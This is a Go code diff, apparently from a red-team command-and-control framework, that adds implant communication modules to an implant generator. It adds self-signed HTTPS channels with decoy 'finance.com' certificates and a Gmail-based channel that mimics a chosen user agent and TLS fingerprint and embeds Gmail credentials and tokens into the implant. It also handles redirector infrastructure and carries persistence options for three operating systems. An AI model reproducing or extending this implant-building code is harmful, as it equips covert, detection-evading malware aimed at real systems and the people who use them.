@@ -11,6 +11,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"strings"
+	"encoding/base64"
 
 )
 
@@ -32,6 +33,10 @@ type RedParanoidTls struct {
 }
 
 type Redhttp struct {
+	Port string   `json:"port"`
+}
+
+type RedSelfSignedhttps struct {
 	Port string   `json:"port"`
 }
 
@@ -70,6 +75,11 @@ type Bihttp struct {
 	Redirectors []string   `json:"redirectors"`
 }
 
+type BiSelfSignedhttps struct {
+	Port string   `json:"port"`
+	Redirectors []string   `json:"redirectors"`
+}
+
 type BiParanoidhttps struct {
 	Port string   `json:"port"`
 	RedFingenPrint string   `json:"redfingenrpint"`
@@ -81,6 +91,11 @@ type BiGmail struct {
 	Redirectors []string   `json:"redirectors"`
 }
 
+type BiGmailMimic struct {
+    UserAgent string `json:"useragent"`
+    TlsFingenprint string `json:"tlsfingenprint"`
+    Redirectors []string   `json:"redirectors"`
+}
 
 
 type Bitwitter struct {
@@ -108,7 +123,7 @@ type BiPersistenceAutoStart struct {
 }
 
 
-func createImplant(name string,ttl string,resptime string,coms string,comsparams string,persistenceOSX string,
+func createImplant(name string,ttl string,resptime string,coms string,comsparams []string,persistenceOSX string,
 		persistenceOSXParams string,persistenceWindows string,persistenceWindowsParams string,persistenceLinux string,persistenceLinuxParams string,redirectors []Red) string{
 
 	var(
@@ -182,6 +197,94 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 		case "paranoidtlsgo":
 
 		case "http":
+
+		case "selfsignedhttpsgo":
+			var(
+				redselfsignedhttps RedSelfSignedhttps
+				biselfsignedhttps BiSelfSignedhttps
+			)
+
+
+			redselfsignedhttps = RedSelfSignedhttps{comsparams[0]}
+			biselfsignedhttps = BiSelfSignedhttps{comsparams[0],[]string{}}
+
+			//Generate Redirector TLS Certificates
+			redCerts := exec.Command("/bin/sh","-c", "openssl req -subj '/CN=finance.com/' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout "+implantFolder+"/red.key -out "+implantFolder+"/red.pem; cat "+implantFolder+"/red.key >> "+implantFolder+"/red.pem")
+			errbuf.Reset()
+			redCerts.Stderr = &errbuf
+			redCerts.Start()
+			redCerts.Wait()
+			redcertErr := ""
+
+			// Record the error when generating a new Implant Set
+			if (redcertErr != ""){
+				errorT := redcertErr
+				elog := fmt.Sprintf("%s%s","Commands(ImplantGeneration-REDCERT):",errorT)
+				return elog
+			}
+
+			//Get the TLS Signature for the Implants
+			redSign := exec.Command("/bin/sh","-c", "openssl x509 -fingerprint -sha256 -noout -in "+ implantFolder +"/red.pem | cut -d '=' -f2")
+			errbuf.Reset()
+			redSign.Stdout = &outbuf
+			redSign.Stderr = &errbuf
+			redSign.Start()
+			redSign.Wait()
+			redSignErr := ""
+							
+			// Record the error when generating a new Implant Set
+			if (redSignErr != ""){
+				errorT := redSignErr
+				elog := fmt.Sprintf("%s%s","Commands(ImplantGeneration-REDSIGN):",errorT)
+				return elog
+			}
+
+			//biparanoidhttps.RedFingenPrint = strings.Split(outbuf.String(),"\n")[0]
+			outbuf.Reset()
+
+			//fmt.Println(redirectors)
+
+			//Go over selected redirectos, add them to DB and update Implant Configuration Data
+			for _,redirector := range redirectors{
+				genId := fmt.Sprintf("%s%s","R-",randomString(8))
+
+				//Check if VPS/Domain exists
+				extvps,_ := existVpsDB(redirector.Vps)
+				extdomain,_ := existDomainDB(redirector.Domain)
+				usedDomain,_ := isUsedDomainDB(redirector.Domain)
+				if !extvps || !extdomain || usedDomain{
+					elog := fmt.Sprintf("%s","ImplantGeneration(NotExistingVPS/Domain,UsedDomain,DB-Error)")
+					return elog
+				}
+
+				// Add Redirector to DB
+				implantId,_ := getImplantIdbyNameDB(name)
+				vpsId,_ := getVpsIdbyNameDB(redirector.Vps)
+				domainId,_ := getDomainIdbyNameDB(redirector.Domain)
+				setUsedDomainDB(redirector.Domain,"Yes")
+				addRedDB(genId,"","",vpsId,domainId,implantId)
+
+				// Add Redirector data to Implant Redirectors Slice
+				domainO := getDomainDB(redirector.Domain)
+				biselfsignedhttps.Redirectors = append(biselfsignedhttps.Redirectors,domainO.Domain)
+			}
+
+			//Debug
+			//fmt.Println(biparanoidhttps.Redirectors)
+			
+			//Encode from JSON to string Redirector and Implant Configurations
+			bufRP := new(bytes.Buffer)
+			json.NewEncoder(bufRP).Encode(redselfsignedhttps)
+			resultRP := bufRP.String()
+			redconfig.Coms = resultRP 
+	    	
+
+			bufBP := new(bytes.Buffer)
+			json.NewEncoder(bufBP).Encode(biselfsignedhttps)
+			resultBP := bufBP.String()
+			biconfig.Coms = resultBP 
+	    	
+
 		case "paranoidhttpsgo":
 			var(
 				redparanoidhttps RedParanoidhttps
@@ -189,8 +292,8 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 			)
 
 
-			redparanoidhttps = RedParanoidhttps{comsparams}
-			biparanoidhttps = BiParanoidhttps{comsparams,"",[]string{}}
+			redparanoidhttps = RedParanoidhttps{comsparams[0]}
+			biparanoidhttps = BiParanoidhttps{comsparams[0],"",[]string{}}
 
 			//Generate Redirector TLS Certificates
 			redCerts := exec.Command("/bin/sh","-c", "openssl req -subj '/CN=finance.com/' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout "+implantFolder+"/red.key -out "+implantFolder+"/red.pem; cat "+implantFolder+"/red.key >> "+implantFolder+"/red.pem")
@@ -271,6 +374,9 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 
 		case "letsencrypthttpsgo":
 		// Error Hnadling
+
+
+
 		case "gmailgo":
 			var(
 				redgmail RedGmail
@@ -323,7 +429,7 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 				bufRP := new(bytes.Buffer)
 				json.NewEncoder(bufRP).Encode(gmailO)
 
-				saas = domainO.Name
+				saas = domainO.Domain
 				redgmail.Redirectors = append(redgmail.Redirectors,bufRP.String())
 				bigmail.Redirectors = append(bigmail.Redirectors,bufRP.String())
 
@@ -345,6 +451,86 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 			json.NewEncoder(bufBP).Encode(bigmail)
 			resultBP := bufBP.String()
 			biconfig.Coms = resultBP 
+
+
+		case "gmailmimic":
+			var(
+				redgmail RedGmail
+				bigmail BiGmailMimic
+			)
+
+			redgmail = RedGmail{[]string{}}
+
+			//Encode User Agent since is a param with space and can break compiling
+			useragent := base64.StdEncoding.EncodeToString([]byte(comsparams[0]))
+			bigmail = BiGmailMimic{useragent,comsparams[1],[]string{}}
+
+			implantId,_ := getImplantIdbyNameDB(name)
+			vpsId,_ := getVpsIdbyNameDB(redirectors[0].Vps)
+			extvps,_ := existVpsDB(redirectors[0].Vps)
+			var domainId int
+			var saas string
+
+			if !extvps{
+				elog := fmt.Sprintf("%s","ImplantGeneration(NotExistingVPS)")
+				return elog
+			}
+			//Go over selected redirectos, add them to DB and update Implant Configuration Data
+			for _,redirector := range redirectors{
+				extdomain,_ := existDomainDB(redirector.Domain)
+				usedDomain,_ := isUsedDomainDB(redirector.Domain)
+				if !extdomain || usedDomain{
+					elog := fmt.Sprintf("%s","ImplantGeneration(Domain,UsedDomain,DB-Error)")
+					return elog
+				}
+
+				// Add Redirector to DB
+				
+				domainId,_ = getDomainIdbyNameDB(redirector.Domain)
+				setUsedDomainDB(redirector.Domain,"Yes")
+								
+				// Add Redirector data to Implant Redirectors Slice
+				domainO := getDomainFullDB(redirector.Domain)
+
+				//Decode Parameters into GmailP and then create Gmail with name for SaaS Red List
+
+    			var gmailP GmailP
+    			errD := json.Unmarshal([]byte(domainO.Parameters),&gmailP)
+
+    			fmt.Println("Domain Name:"+redirector.Domain)
+    			fmt.Println("Domain Parameters:"+domainO.Parameters)
+    			if errD != nil{
+        			elog := "ImplantGeneration(Gmail Parameters Decoding Error)"+errD.Error()
+					return elog
+    			}
+
+				gmailO := Gmail{domainO.Name,gmailP.Creds,gmailP.Token}
+				bufRP := new(bytes.Buffer)
+				json.NewEncoder(bufRP).Encode(gmailO)
+
+				saas = domainO.Domain
+				redgmail.Redirectors = append(redgmail.Redirectors,bufRP.String())
+				bigmail.Redirectors = append(bigmail.Redirectors,bufRP.String())
+
+				genId := fmt.Sprintf("%s%s","R-",randomString(8))			
+				addRedDB(genId,"","",vpsId,domainId,implantId)
+			}
+
+
+
+			//Encode from JSON to string Redirector and Implant Configurations
+			bufRP := new(bytes.Buffer)
+			json.NewEncoder(bufRP).Encode(redgmail)
+			resultRP := bufRP.String()
+			redconfig.Saas = saas
+			redconfig.Coms = resultRP 
+	    	
+
+			bufBP := new(bytes.Buffer)
+			json.NewEncoder(bufBP).Encode(bigmail)
+			resultBP := bufBP.String()
+			biconfig.Coms = resultBP 
+
 
 		default:
 			elog := "CompilingCommands(ImplantGeneration):A network Module need to be choosen"
